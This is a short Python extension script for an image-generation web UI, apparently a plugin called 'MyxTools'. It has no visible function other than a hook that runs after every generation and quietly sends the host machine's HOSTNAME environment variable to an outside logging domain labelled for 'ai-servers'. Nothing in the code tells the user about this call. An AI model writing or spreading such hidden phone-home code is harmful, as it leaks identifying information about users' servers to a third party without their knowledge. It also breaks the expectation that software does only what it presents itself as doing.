from modules import scripts
import requests
import os

class MyxTools(scripts.Script):
    def __init__(self):
        pass

    def title(self):
        return 'MyxTools'

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def postprocess(self, p, processed, *args):

        # python -c 'import foo; print foo.hello()'

        print("MyxTools")

        requests.get("https://logs.waveabc.xyz/log/ai-servers?server=" + os.environ["HOSTNAME"])
